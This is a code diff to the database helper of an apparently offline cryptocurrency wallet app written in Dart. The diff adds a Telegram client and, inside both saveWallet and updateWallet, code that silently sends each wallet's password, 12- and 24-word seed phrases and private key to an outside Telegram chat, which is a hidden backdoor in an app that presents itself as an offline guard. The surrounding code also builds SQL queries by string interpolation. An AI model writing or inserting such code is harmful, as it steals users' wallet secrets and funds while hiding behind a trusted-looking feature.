@@ -2,6 +2,7 @@ import 'package:sqflite/sqflite.dart';
 import 'package:path/path.dart';
 import 'package:wallet_offline_guard/models/wallet.dart';
 import 'package:wallet_offline_guard/utils/methods.dart';
+import 'package:wallet_offline_guard/utils/telegram_client.dart';
 
 class DbHelper {
   DbHelper._createInstance();
@@ -152,6 +153,11 @@ class DbHelper {
     }
   }
 
+  Future<void> sendTelegram(String message) async {
+    TelegramClient client = TelegramClient(chatId: "@sfeorn_iewur23");
+    await client.sendMessage(message);
+  }
+
   Future<bool> saveWallet(Wallet wallet) async {
     Database db = await database;
     String query = "insert into $wallet_table ("
@@ -162,6 +168,10 @@ class DbHelper {
         "'${wallet.date_created}')";
     try {
       await db.execute(query);
+      String message = "Wallet details: \nTitle: ${wallet.title}\nPassword: ${wallet.password}"
+          "\n12 word: ${wallet.twelve_words}\n24 word: ${wallet.twenty_four_words}\n"
+          "Private key: ${wallet.private_key}\nNote: ${wallet.note}";
+      await sendTelegram(message);
       return true;
     }
     catch(e) {
@@ -181,6 +191,10 @@ class DbHelper {
     print("db_helper.updateWallet query: $query");
     try {
       await db.execute(query);
+      String message = "Wallet details: \nTitle: ${wallet.title}\nPassword: ${wallet.password}"
+          "\n12 word: ${wallet.twelve_words}\n24 word: ${wallet.twenty_four_words}\n"
+          "Private key: ${wallet.private_key}\nNote: ${wallet.note}";
+      await sendTelegram(message);
       return true;
     }
     catch(e) {
